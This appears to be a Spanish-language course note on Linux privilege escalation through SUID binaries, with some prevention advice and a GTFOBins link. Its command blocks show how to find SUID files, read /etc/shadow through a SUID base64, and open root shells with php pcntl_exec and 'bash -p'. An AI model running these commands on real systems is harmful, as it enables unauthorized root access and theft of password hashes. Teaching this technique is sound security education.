# Abusando de privilegios SUID

Tags: #Linux #SUID  #Escalada #Root #Privilegios 

Un privilegio **SUID** (**Set User ID**) es un permiso especial que se puede establecer en un archivo binario en sistemas Unix/Linux. Este permiso le da al usuario que ejecuta el archivo los **mismos privilegios** que el **propietario** del archivo.

Por ejemplo, si un archivo binario tiene establecido el permiso SUID y es propiedad del usuario root, cualquier usuario que lo ejecute adquirirá temporalmente los mismos privilegios que el usuario root, lo que le permitirá realizar acciones que normalmente no podría hacer como un usuario normal.

El abuso de privilegios SUID es una técnica utilizada por los atacantes para elevar su nivel de acceso en un sistema comprometido. Si un atacante es capaz de obtener acceso a un archivo binario con permisos SUID, puede ejecutar comandos con privilegios especiales y realizar acciones maliciosas en el sistema.

Para prevenir el abuso de privilegios SUID, se recomienda limitar el número de archivos con permisos SUID y asegurarse de que solo se otorguen a archivos que requieran este permiso para funcionar correctamente. Además, es importante monitorear regularmente el sistema para detectar cambios inesperados en los permisos de los archivos y para buscar posibles brechas de seguridad.

Una vez más, se os comparte el mismo recurso que en la clase anterior, dado que esta página también contempla los binarios con permiso SUID que potencialmente pueden ser explotados:

- **GTFOBins**: [https://gtfobins.github.io](https://gtfobins.github.io/)

## SUID

En la pagina de GTFOBins buscamos el comando y la pestaña de **SUID**
* El comando que tiene un privilegios SUID contiene una **S**  o 4755
* Este tipo de comandos afecta a nivel de sistema a todos los usuarios 

```bash 
❯ find / -perm -4000 2>/dev/null                  # Para ver que comandos son SUID, los buscamos desde la raiz 
❯ find / -perm -4000 -ls 2>/dev/null              # Para ver que comandos son SUID, los buscamos desde la raiz y ademas miramos el privilegio
❯ find / -perm -u=s -type f 2>/dev/null           # Buscar comandos SUID desde la raiz 
❯ find \-user <username> 2>/dev/null              # Para ver que comandos donde el propiertario es es usuario
```

```bash 
# Se puede encontrar comandos de este tipo:
-rwsr-xr-x 1 root root 8756 Feb 7 2022 /usr/bin/base64
-rwsr-xr-x 1 root root 8756 Feb 9 2022 /usr/bin/php8.1

# Ejecutar el comando si es SUID como el propietario de forma temporal y sin passwd
❯ base64 /etc/shadow | base64 -d                  # Podriamos ver el /etc/shadow

❯ php -r "pcntl_exec('/bin/sh', ['-p']);"     # Obtener una consola interactiva
❯ bash -p                                     # Obtener la consola bash, p = privilege

# Podemos ejecutar como root
❯ sudo /home/file.sh 

❯ sudo -u <user> /home/file.sh    # Si el usuario no necesite permisos para ejecutar el binario
```

